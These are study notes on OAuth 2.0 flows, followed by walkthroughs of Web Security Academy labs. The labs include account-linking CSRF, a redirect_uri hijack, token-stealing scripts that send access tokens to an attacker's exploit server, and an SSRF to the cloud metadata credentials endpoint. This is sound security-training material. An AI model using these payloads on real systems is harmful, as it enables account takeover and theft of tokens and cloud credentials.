# OAuth
OAuth is a commonly used authorization framework that enables websites and web applications to request limited access to a user's account on another application. Crucially, OAuth allows the user to grant this access without exposing their login credentials to the requesting application. This means users can fine-tune which data they want to share rather than having to hand over full control of their account to a third party.

## How does OAuth 2.0 work?
### Authorization Code grant type
**1. Authorization request**
   
The client application sends a request to the OAuth service's /authorization endpoint asking for permission to access specific user data. 

    GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
    Host: oauth-authorization-server.com

This request contains the following noteworthy parameters, usually provided in the query string:

    client_id

Mandatory parameter containing the unique identifier of the client application. This value is generated when the client application registers with the OAuth service.

    redirect_uri    

The URI to which the user's browser should be redirected when sending the authorization code to the client application. This is also known as the "callback URI" or "callback endpoint". Many OAuth attacks are based on exploiting flaws in the validation of this parameter.

    response_type

Determines which kind of response the client application is expecting and, therefore, which flow it wants to initiate. For the authorization code grant type, the value should be code.

    scope

Used to specify which subset of the user's data the client application wants to access. 

    state

Stores a unique, unguessable value that is tied to the current session on the client application. The OAuth service should return this exact value in the response, along with the authorization code. This parameter serves as a form of CSRF token for the client application by making sure that the request to its `/callback` endpoint is from the same person who initiated the OAuth flow.

**2. User login and consent**
When the authorization server receives the initial request, it will redirect the user to a login page, where they will be prompted to log in to their account with the OAuth provider. 

They will then be presented with a list of data that the client application wants to access. This is based on the scopes defined in the authorization request. The user can choose whether or not to consent to this access.

It is important to note that once the user has approved a given scope for a client application, this step will be completed automatically as long as the user still has a valid session with the OAuth service. In other words, the first time the user selects "Log in with social media", they will need to manually log in and give their consent, but if they revisit the client application later, they will often be able to log back in with a single click.

**3. Authorization code grant**
If the user consents to the requested access, their browser will be redirected to the `/callback` endpoint that was specified in the `redirect_uri` parameter of the authorization request. The resulting GET request will contain the authorization code as a query parameter. Depending on the configuration, it may also send the state parameter with the same value as in the authorization request.

    GET /callback?code=a1b2c3d4e5f6g7h8&state=ae13d489bd00e3c24 HTTP/1.1
    Host: client-app.com

**4. Access token request**
Once the client application receives the authorization code, it needs to exchange it for an access token. To do this, it sends a server-to-server `POST` request to the OAuth service's `/token` endpoint. All communication from this point on takes place in a secure back-channel and, therefore, cannot usually be observed or controlled by an attacker.

    POST /token HTTP/1.1
    Host: oauth-authorization-server.com
    …
    client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8

In addition to the client_id and authorization code, you will notice the following new parameters:

    client_secret

The client application must authenticate itself by including the secret key that it was assigned when registering with the OAuth service.

    grant_type

Used to make sure the new endpoint knows which grant type the client application wants to use. In this case, this should be set to authorization_code.

**5. Access token grant**
The OAuth service will validate the access token request. If everything is as expected, the server responds by granting the client application an access token with the requested scope.

    {
        "access_token": "z0y9x8w7v6u5",
        "token_type": "Bearer",
        "expires_in": 3600,
        "scope": "openid profile",
        …
    }

**6. API call**
Now the client application has the access code, it can finally fetch the user's data from the resource server. To do this, it makes an API call to the OAuth service's `/userinfo` endpoint. The access token is submitted in the `Authorization: Bearer` header to prove that the client application has permission to access this data.

    GET /userinfo HTTP/1.1
    Host: oauth-resource-server.com
    Authorization: Bearer z0y9x8w7v6u5

**7. Resource grant**
The resource server should verify that the token is valid and that it belongs to the current client application. If so, it will respond by sending the requested resource i.e. the user's data based on the scope of the access token.

    {
        "username":"carlos",
        "email":"carlos@carlos-montoya.net",
        …
    }

### Implicit grant type
This is far less secure than authorization code grant type. When using the implicit grant type, all communication happens via browser redirects - there is no secure back-channel like in the authorization code flow. This means that the sensitive access token and the user's data are more exposed to potential attacks.

The implicit grant type is more suited to single-page applications and native desktop applications, which cannot easily store the client_secret on the back-end, and therefore, don't benefit as much from using the authorization code grant type.

**1. Authorization request**
The implicit flow starts in much the same way as the authorization code flow. The only major difference is that the `response_type` parameter must be set to token.

    GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
    Host: oauth-authorization-server.com

**2. User login and consent**
The user logs in and decides whether to consent to the requested permissions or not. This process is exactly the same as for the authorization code flow.

**3. Access token grant**
If the user gives their consent to the requested access, this is where things start to differ. The OAuth service will redirect the user's browser to the `redirect_uri` specified in the authorization request. However, instead of sending a query parameter containing an authorization code, it will send the access token and other token-specific data as a URL fragment.

    GET /callback#access_token=z0y9x8w7v6u5&token_type=Bearer&expires_in=5000&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
    Host: client-app.com

As the access token is sent in a URL fragment, it is never sent directly to the client application. Instead, the client application must use a suitable script to extract the fragment and store it.

**4. API call**
Once the client application has successfully extracted the access token from the URL fragment, it can use it to make API calls to the OAuth service's /userinfo endpoint. Unlike in the authorization code flow, this also happens via the browser.

    GET /userinfo HTTP/1.1
    Host: oauth-resource-server.com
    Authorization: Bearer z0y9x8w7v6u5

**5. Resource grant**
The resource server should verify that the token is valid and that it belongs to the current client application. If so, it will respond by sending the requested resource i.e. the user's data based on the scope associated with the access token.

    {
        "username":"carlos",
        "email":"carlos@carlos-montoya.net"
    }

## OAuth authentication
1. The user chooses the option to log in with their social media account. The client application then uses the social media site's OAuth service to request access to some data that it can use to identify the user. 
2. After receiving an access token, the client application requests this data from the resource server, typically from a dedicated /userinfo endpoint.
3. Once it has received the data, the client application uses it in place of a username to log the user in. The access token that it received from the authorization server is often used instead of a traditional password.

### LAB: Authentication bypass via OAuth implicit flow
Study the OAuth authentication flow, notice the `POST /authenticate HTTP/2` request, change its body to this:

    {
        "email":"carlos@carlos-montoya.net",
        "username":"wiener",
        "token":"7GLtuc8rTlCD5DaXFgjYk1nh0zkXXWmmdkLMbcEmsOt"
    }

We successfully logged in via carlos' account which indicates that the access token is not tied to each account.

### LAB: Forced OAuth profile linking
Notice that the OAuth server does not send a `state` parameter, which means the code sent from the server is not tied to any user's session. We can use that code to make victim link his account to our social media account. 
Intercept the linking social media account flow until we got the code from the server. Send this to make the victim link his account to that code:

    <img src="https://0a2b004203afa2cb80f59ef900e900df.web-security-academy.net/oauth-linking?code=sR98Oxu5FSJEsXziiCJKeQx4yg6U6OgVzn3Oa29Zv__">

Once the victim visits the link, we can use our social media account to login to his account and delete Carlos.

### LAB: OAuth account hijacking via redirect_uri
Try changing the value of the parameter `redirect_uri` in this request to our exploit server:

    GET /auth?client_id=rrfxlxt97swn6lab64807&redirect_uri=https://exploit-0a61000b04614159846d5815014a005f.exploit-server.net/exploit&response_type=code&scope=openid%20profile%20email

Notice the server accepts this and sends the authorization code to this URI. Make use of that, send this to the victim:

    <img src="https://oauth-0ae600b6046441a7847d570a02ab007a.oauth-server.net/auth?client_id=rrfxlxt97swn6lab64807&redirect_uri=https://exploit-0a61000b04614159846d5815014a005f.exploit-server.net/exploit&response_type=code&scope=openid%20profile%20email">

When the victim visits our exploit server, the browser will make a call to the OAuth server asking for the authorization code of the victim's account. But instead sending it to the web server, it is sending the code to our server. Check the log for the code and found this request:

    GET /exploit?code=wWe6IncYPAbZvKsZeJyRlXdE1qJYj5b41xp2zX9qvRD HTTP/1.1

Use that code to login to the victim's account using this request:

    GET /oauth-callback?code=wWe6IncYPAbZvKsZeJyRlXdE1qJYj5b41xp2zX9qvRD HTTP/2
    Host: 0a8300e3049c411984e0594600ce00fe.web-security-academy.net

Once logged in, delete Carlos.

### LAB: Stealing OAuth access tokens via an open redirect
Same as above lab but now, the OAuth server is white-listing the `redirect_uri` parameter to start with: `https://0a58007303fb5d4f80e83a4c007e007f.web-security-academy.net/oauth-callback/`. 
Notice an open redirect with path traversal in the next blog function. Make use of that bypass the white list using this `redirect_uri=https://0a58007303fb5d4f80e83a4c007e007f.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a10005e03a45d8e801439e201d60054.exploit-server.net/exploit&response_type=token&nonce=1440916710&scope=openid%20profile%20email`.
Use this script to make the user ask for the authorization token, when the OAuth server answers back to our exploit server in the hash, extract it and call to our server with the `access_token` appended as a parameter:

    <script>
        if (window.location.hash) {
            window.location = 'https://exploit-0a10005e03a45d8e801439e201d60054.exploit-server.net'+window.location.hash.substr(1)
        } else {
            window.location="https://oauth-0aa0004403675ddd800738cd02790099.oauth-server.net/auth?client_id=w9yk0olkgr0cqzu5z68q1&redirect_uri=https://0a58007303fb5d4f80e83a4c007e007f.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a10005e03a45d8e801439e201d60054.exploit-server.net/exploit&response_type=token&nonce=1440916710&scope=openid%20profile%20email"
        }
    </script>

Visit the log to retrieve the token. Make this request to get the client's API key:

    GET /me HTTP/2
    Host: oauth-0aa0004403675ddd800738cd02790099.oauth-server.net
    Authorization: Bearer PW9GDhVlpu0ui081Un1xA6eu4IFyKhCirF2OZX0X29h

### LAB: Stealing OAuth access tokens via a proxy page
Notice the post comment function is using an iframe, where in its script, it will post a message to the parent with the value of `window.location.href`.
The `redirect_uri` parameter is vulnerable like the above lab. To make use of that, use this script at our exploit server:

    <iframe
        src="https://oauth-0a8700530429098d803747ed026800b6.oauth-server.net/auth?client_id=ct6g8rxfr8cqojpc63zsq&redirect_uri=https://0afe009b042c09c480fa491f006b0008.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=16875317&scope=openid%20profile%20email"
    ></iframe>
    <script>
        window.addEventListener(
            "message",
            function (e) {
            fetch("/" + encodeURIComponent(e.data.data));
            },
            false
        );
    </script>

The server will first poisone the `redirect_uri` so that it returns the `access_token` to the `post/comment/comment-form` endpoint. This endpoint will post a message containing the `window.location.href` to its parent (our exploit server). All we have left to do is add a listener and put the message into the `GET` request to later retrieve via the log.
The last steps are just the same as the above lab.

### LAB: SSRF via OpenID dynamic client registration
> Note: [OpenID stuff](https://portswigger.net/web-security/oauth/openid)

Visit the documentation page of the OAuth server at:

    https://oauth-0adb006c037ba83783e5635a02d200d5.oauth-server.net/.well-known/openid-configuration

Notice the registration endpoint:

    "registration_endpoint":"https://oauth-0adb006c037ba83783e5635a02d200d5.oauth-server.net/reg"

When auditing the OAuth flow, notice a `GET` request for the web's logo. This is fetched from `/client/CLIENT-ID/logo`. We know from the OpenID specification that client applications can provide the URL for their logo using the `logo_uri` property during dynamic registration. Send this request to try to register a web application to the OAuth server:

    POST /reg HTTP/2
    Host: oauth-0adb006c037ba83783e5635a02d200d5.oauth-server.net
    Content-Type: application/json
    Accept: application/json
    Content-Length: 140

    {
        "redirect_uris":  [
            "https://exapmle.com"
        ]
    }

Notice we don't need any key to register a web app. Make us of that and register a web app with `logo_uri` specified to the a location in the victim's network to conduct a SSRF attack:

    POST /reg HTTP/2
    Host: oauth-0adb006c037ba83783e5635a02d200d5.oauth-server.net
    Cookie: session=9QAOAtg03inNNyvMOij8TRJqykxBy5gb
    Content-Type: application/json
    Accept: application/json
    Content-Length: 140

    {
        "redirect_uris":  [
            "https://exapmle.com"
        ],
        "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
    }

Retrieve the `client_id` (`9dax2GfyIL9igmwBuB4Eg`) from the response and send this request:

    GET /client/9dax2GfyIL9igmwBuB4Eg/logo HTTP/2
    Host: oauth-0adb006c037ba83783e5635a02d200d5.oauth-server.net
    Cookie: session=9QAOAtg03inNNyvMOij8TRJqykxBy5gb
    Accept: application/json

Get the `SecretAccessKey` and submit the solution.
